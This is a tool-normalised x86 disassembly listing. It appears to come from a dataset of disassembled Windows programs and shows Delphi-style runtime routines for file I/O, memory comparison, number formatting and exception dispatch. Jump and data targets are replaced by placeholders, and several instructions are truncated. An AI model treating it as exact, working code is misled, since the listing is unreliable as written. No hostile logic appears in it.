mov [ ebx + 0x18 ] sub_404730
mov eax edi
call sub_406f30
mov esi eax
mov eax edi
lea edx [ ebx + 0x48 ]
mov ecx esi
add ecx ecx
call sub_4043c8
mov [ ebx + esi * 2 + 0x48 ] 0x0
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_404944
push ebx
movzx ecx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40438c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_4049a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0x10 ]
movzx edx [ ebx + 0x4 ]
and edx eax
cmp eax edx
jne r-xdata
mov eax 0x67
call sub_40438c
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
imul esi
push eax
push edi
mov eax [ ebx ]
push eax
call [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
xor edx edx
div ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
call sub_4024e8
call sub_40438c
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov eax [ ebp + 0x8 ]
call sub_40438c
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_404a78
push ebx
push esi
mov ebx eax
xor esi esi
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40438c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40438c
jmp r-xdata
sub_404ad0
push ebx
movzx ebx [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
movzx ecx cl
xchg edx eax
call sub_4043c8
pop ebx
retn
mov ecx ebx
sub_404aec
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_404b5c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404b78
mov esi eax
mov eax ebx
call sub_404bc8
cmp esi eax
setge al
pop esi
pop ebx
retn
sub_404b78
push ebx
push esi
mov ebx eax
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b0
jbe r-xdata
mov eax 0x67
call sub_40438c
or esi 0xffffffff
cmp ax 0xd7b3
ja r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebx ]
push eax
call sub_402478
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
xor edx edx
div [ ebx + 0x8 ]
mov esi eax
jmp r-xdata
call sub_40439c
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_404bc8
push ebx
push esi
mov ebx eax
or esi 0xffffffff
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b0
jbe r-xdata
mov eax 0x67
call sub_40438c
cmp ax 0xd7b3
ja r-xdata
push 0x0
mov eax [ ebx ]
push eax
call GetFileSize
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
xor edx edx
div [ ebx + 0x8 ]
mov esi eax
jmp r-xdata
call sub_40439c
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_404c14
cmp edx 0x20
mov ch cl
jl r-xdata
test edx edx
jle r-xdata
mov [ eax ] cx
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] cx
sub edx 0x10
fld [ eax ]
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
mov ecx eax
and ecx 0x7
sub ecx 0x8
sub eax ecx
add edx ecx
add eax edx
neg edx
retn
mov [ edx + eax - 0x1 ] cl
and edx 0xfffffffe
neg edx
lea edx [ edx * 2 + r-xdata ]
jmp edx
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
add edx 0x10
jl r-xdata
ffree st0
fincstp
retn
mov [ eax + 0x1c ] cx
mov [ eax + 0x1a ] cx
mov [ eax + 0x18 ] cx
mov [ eax + 0x16 ] cx
mov [ eax + 0x14 ] cx
mov [ eax + 0x12 ] cx
mov [ eax + 0x10 ] cx
mov [ eax + 0xe ] cx
mov [ eax + 0xc ] cx
mov [ eax + 0xa ] cx
mov [ eax + 0x8 ] cx
mov [ eax + 0x6 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x2 ] cx
mov [ eax ] cx
retn
sub_404cb0
push ebx
push esi
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
xor esi esi
mov eax [ ebx ]
call sub_404700
test al al
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40439c
mov esi 0x1
sub_404cd8
push ebx
push esi
push edi
mov esi edx
mov edi ecx
xor edx edx
mov ebx eax
mov dx [ eax + 0x4 ]
sub edx 0xd7b0
je r-xdata
mov [ ebx + 0x4 ] 0xd7b3
mov [ ebx + 0x8 ] esi
mov [ ebx + 0x24 ] sub_404cb0
mov [ ebx + 0x1c ] sub_4046c0
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp edx 0x3
ja r-xdata
mov [ ebx + 0x24 ] sub_4046c0
cmp edi 0x3
je r-xdata
mov eax 0xc0000000
mov dl [ rw-data ]
and edx 0x70
shr edx 0x2
mov edx [ edx + rw-data ]
mov ecx 0x2
sub edi 0x3
je r-xdata
mov eax 0x66
jmp r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
push 0xfffffff5
push 0xfffffff6
jmp r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ ebx + 0x48 ]
push eax
call sub_402418
mov ecx 0x3
inc edi
je r-xdata
call sub_40438c
call sub_40438c
cmp eax 0xffffffff
je r-xdata
call sub_402450
jmp r-xdata
mov [ ebx + 0x4 ] 0xd7b0
call sub_4024e8
mov [ ebx ] eax
jmp r-xdata
mov eax 0x40000000
inc edi
mov [ ebx + 0x4 ] 0xd7b2
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x80000000
mov [ ebx + 0x4 ] 0xd7b1
sub_404de0
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
add esi 0x2
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bx [ esi ]
add esi 0x2
cmp bx 0x20
je r-xdata
mov ch 0x0
cmp bx 0x2d
je r-xdata
shr esi 0x1
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bx 0x2b
je r-xdata
cmp bx 0x24
je r-xdata
mov bx [ esi ]
add esi 0x2
jmp r-xdata
mov edi 0xfffffff
mov bx [ esi ]
add esi 0x2
test bx bx
je r-xdata
cmp bx 0x78
je r-xdata
cmp bx 0x61
jb r-xdata
cmp bx 0x58
je r-xdata
sub bx 0x30
cmp bx 0x9
jbe r-xdata
sub bx 0x20
cmp bx 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bx 0x11
cmp bx 0x5
ja r-xdata
test bx bx
je r-xdata
mov bx [ esi ]
add esi 0x2
cmp bx 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bx [ esi ]
add esi 0x2
test bx bx
jne r-xdata
add bx 0xa
sub bx 0x30
cmp bx 0x9
ja r-xdata
cmp bx 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bx bx
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bx [ esi ]
add esi 0x2
test bx bx
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_404ee4
push ebx
push edi
mov edi eax
xor ebx ebx
mov bl cl
mov ecx ebx
xor eax eax
[ edi ]
sub edi ebx
inc eax
mov cl dl
rol al cl
shr ecx 0x3
cmp ecx ebx
jae r-xdata
pop edi
pop ebx
retn
or [ ecx + edi ] al
sub_404f08
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
mov al [ ecx + esi ]
mov dl [ ecx + edi ]
cmp al dl
jne r-xdata
movzx eax [ ecx + esi - 0x1 ]
movzx edx [ ecx + edi - 0x1 ]
cmp eax edx
jne r-xdata
pop edi
pop esi
retn
or ecx ecx
pop edi
pop esi
retn
dec ecx
jne r-xdata
dec ecx
je r-xdata
sub_404f48
push ebx
xor ebx ebx
push edi
mov edi edx
mov ecx eax
sub esp 0xa
mov [ edi ] 0x30
fmul [ ebx + rw-data ]
frndint
fcom [ ebx + rw-data ]
fwait
fnstsw ax
sahf
jb r-xdata
fbstp [ esp ]
mov edx 0x8
inc edi
fsub [ ebx + rw-data ]
mov [ edi ] 0x31
fwait
mov al [ esp + edx ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jns r-xdata
sub ecx 0x12
jl r-xdata
add edi ecx
cmp [ edi ] 0x35
jl r-xdata
mov al 0x30
[ edi ]
jmp r-xdata
add esp 0xa
pop edi
pop ebx
retn
dec edi
inc [ edi ]
cmp [ edi ] 0x39
jle r-xdata
mov [ edi ] 0x30
jmp r-xdata
sub_404fb8
push ebx
sub esp 0xc
xor ebx ebx
cmp [ esp + 0x4 ] 0x0
jne r-xdata
sub ax 0x3fff
mov dx 0x4d10
imul dx
movsx eax dx
neg eax
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
add esp 0xc
mov eax ebx
pop ebx
retn
sub ebx eax
call sub_4051c0
jmp r-xdata
fld st0
fstp [ esp ]
mov ax [ esp + 0x8 ]
test ax ax
je r-xdata
sub_404ffc
fld [ esp + 0x4 ]
push ebx
push esi
push edi
mov ebx eax
mov esi edx
push ecx
sub esp 0x100
cmp ebx 0xff
jle r-xdata
fld st0
fstp [ esp ]
xor eax eax
mov ax [ esp + 0x8 ]
mov edi eax
shr edi 0xf
and ax 0x7fff
cmp ax 0x7fff
je r-xdata
mov ebx 0xff
xor eax eax
fstp st0
cmp [ esp + 0x4 ] 0x80000000
lea esi [ eax + rw-data ]
jne r-xdata
fabs
test esi esi
jge r-xdata
mov edi ecx
mov ecx ebx
mov [ edi ] cl
inc edi
sub cl [ esi ]
jbe r-xdata
dec edi
lea esi [ eax + rw-data ]
jne r-xdata
cmp esi 0xd8
jle r-xdata
call sub_404fb8
sub [ edi - 0x1 ] cl
mov cl [ esi ]
inc esi
[ edi ] [ esi ]
jmp r-xdata
mov al 0x20
[ edi ]
lea esi [ eax + rw-data ]
fcom [ rw-data ]
fwait
fnstsw ax
sahf
mov eax 0x0
jb r-xdata
mov esi 0xd8
cmp esi 0x12
jle r-xdata
mov esi 0x2
jmp r-xdata
add esp 0x100
pop ecx
pop edi
pop esi
pop ebx
retn 0xc
inc eax
mov edx esp
push eax
add eax esi
call sub_404f48
pop eax
mov edx esi
mov esi esp
cmp [ esi ] 0x30
je r-xdata
call sub_404fb8
cmp eax 0x23
jg r-xdata
mov edx esp
push eax
mov eax esi
call sub_404f48
mov edx edi
mov edi [ esp + 0x104 ]
mov [ edi ] bl
inc edi
mov al 0x20
mov ecx ebx
sub ecx esi
sub ecx 0x8
jle r-xdata
mov esi 0x12
inc esi
mov ecx eax
add ecx edi
test edx edx
je r-xdata
inc eax
dec esi
mov esi ebx
sub esi 0x8
cmp esi 0x2
jge r-xdata
sub [ edi - 0x1 ] cl
test dl dl
je r-xdata
[ edi ]
push eax
push edi
mov edi [ esp + 0x108 ]
mov [ edi ] bl
inc edi
sub ebx ecx
mov ecx ebx
jle r-xdata
inc ecx
add ecx edx
cmp ebx ecx
jg r-xdata
stosb [ edi ]
pop eax
mov ecx esi
mov esi esp
cmp [ esi ] 0x30
je r-xdata
mov al 0x2d
sub [ edi - 0x1 ] cl
pop eax
pop ecx
test eax eax
je r-xdata
mov al 0x20
[ edi ]
mov ebx ecx
inc esi
movsb [ edi ] [ esi ]
mov [ edi ] 0x2e
inc edi
dec ecx
[ edi ] [ esi ]
mov [ edi ] 0x45
mov cl 0x2b
test eax eax
jge r-xdata
inc eax
dec esi
[ edi ] [ esi ]
test edx edx
je r-xdata
mov [ edi ] 0x2d
inc edi
mov [ edi + 0x1 ] cl
xor edx edx
mov cx 0xa
div cx
add dl 0x30
mov [ edi + 0x5 ] dl
xor edx edx
div cx
add dl 0x30
mov [ edi + 0x4 ] dl
xor edx edx
div cx
add dl 0x30
mov [ edi + 0x3 ] dl
add al 0x30
mov [ edi + 0x2 ] al
jmp r-xdata
mov cl 0x2d
neg eax
mov [ edi ] 0x2e
inc edi
mov ecx edx
[ edi ] [ esi ]
sub_4051c0
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_405273 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_405273 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_405273
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4054e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_40556d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4054c8
lea eax [ ebp - 0x4 ]
call sub_406a60
call sub_407400
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
lea eax [ ebp - 0x8 ]
call sub_406a60
call sub_407400
push eax
mov eax [ ebp - 0x8 ]
call sub_407134
push eax
push 0x1
mov eax [ rw-data ]
push eax
call sub_4024a0
cmp eax 0x2
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405574
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4055fc
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x34 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x30 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x54 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_405654
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_407df0
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x4c ]
mov esi [ esi - 0x30 ]
test edx edx
je r-xdata
mov eax ebx
call sub_405bc4
pop esi
pop ebx
retn
sub_40567c
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_409ccc
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4056b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_405778
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
mov edx [ ebp - 0x8 ]
mov eax [ edi ]
call sub_405788
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
xor edx edx
cmp edx [ esp + 0x4 ]
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x18 ]
mov eax edi
call sub_40567c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_409ccc
jmp r-xdata
add edi eax
mov [ ebx ] edi
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40577f
lea eax [ ebp - 0xc ]
call sub_409cb4
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
cmp edx [ rw-data ]
jne r-xdata
mov eax [ ebx ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov [ ebx ] edi
sub_405788
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x54 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4057d4
push ebx
push esi
push edi
mov esi edx
call sub_4058a8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
xor edx edx
call sub_4070a8
mov edi ebx
mov eax edi
add eax 0x2
inc edi
movzx edx [ edi ]
add eax edx
add eax 0xa
mov edx esi
call sub_40a1f0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40580c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_405894
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40584c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x3c ]
test edi edi
je r-xdata
mov esi [ esi - 0x30 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_40587c
push eax
push ecx
mov eax [ eax ]
call sub_40584c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_4067e0
call [ rw-data ]
sub_4058d8
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40584c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_405900
push ebx
push esi
add esp 0xfffffc00
mov ebx edx
push 0x100
lea edx [ esp + 0x4 ]
push edx
movzx edx [ eax ]
push edx
inc eax
push eax
push 0x0
push 0xfde9
call sub_402550
mov esi eax
push 0x100
lea eax [ esp + 0x204 ]
push eax
movzx eax [ ebx ]
push eax
lea eax [ ebx + 0x1 ]
push eax
push 0x0
push 0xfde9
call sub_402550
mov ebx eax
push ebx
lea eax [ esp + 0x204 ]
push eax
push esi
lea eax [ esp + 0xc ]
push eax
push 0x1
mov eax [ rw-data ]
push eax
call sub_402498
cmp eax 0x2
sete al
add esp 0x400
pop esi
pop ebx
retn
sub_40598c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x40 ]
test esi esi
je r-xdata
mov eax [ eax - 0x30 ]
test eax eax
jne r-xdata
mov di [ esi ]
test edi edi
je r-xdata
mov eax [ eax ]
jmp r-xdata
add esi 0x2
pop edi
pop esi
pop ebx
retn
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
push eax
push edx
lea eax [ esi + 0x6 ]
call sub_405900
xor ecx ecx
test al al
pop edx
pop eax
je r-xdata
xor bl [ ecx + edx ]
test bl 0x80
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ edx ]
jmp r-xdata
jmp r-xdata
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
dec ecx
jne r-xdata
mov bl [ ecx + esi + 0x6 ]
test bl 0x80
jne r-xdata
sub_4059fc
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_409ff8
mov edx esp
mov eax ebx
call sub_40598c
add esp 0x100
pop esi
pop ebx
retn
sub_405a24
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x40 ]
test esi esi
je r-xdata
mov eax [ eax - 0x30 ]
test eax eax
jne r-xdata
mov cx [ esi ]
test ecx ecx
je r-xdata
mov eax [ eax ]
lea esi [ r-xdata ]
jmp r-xdata
add esi 0x2
mov eax esi
mov edx edi
pop edi
pop esi
pop ebx
jmp r-xdata
add esi 0x6
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40a1f0
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_405a70
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x30 ]
test eax eax
jne r-xdata
mov di [ esi ]
test edi edi
je r-xdata
mov eax [ eax ]
mov esi [ eax - 0x44 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
add esi 0x6
pop edi
pop esi
pop ebx
retn
mov bl [ ecx + esi + 0x6 ]
test bl 0x80
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
push eax
push edx
lea eax [ esi + 0x6 ]
call sub_405900
xor ecx ecx
test al al
pop edx
pop eax
je r-xdata
xor bl [ ecx + edx ]
test bl 0x80
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
jmp r-xdata
and bl 0xdf
jne r-xdata
mov eax [ esi ]
pop edx
add eax edx
dec ecx
jne r-xdata
sub_405ae4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_409ff8
mov edx esp
mov eax ebx
call sub_405a70
add esp 0x100
pop esi
pop ebx
retn
sub_405b0c
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_405b35
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_405b64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405b93
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax [ ebp - 0x4 ]
pop [ fs : 0x0 ]
add esp 0x8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405bdc
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
xor edx edx
call sub_404220
pop esi
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov esi [ rw-data ]
call [ esi + 0x4 ]
sub_405c34
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_405c70
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_405c84
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_405c98
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_405cb8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_405c98
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_405d1c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4054a4
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_40a7e8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_405c84
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_405c34
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_405e48
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4054a4
mov edx [ rw-data ]
test edx edx
je r-xdata
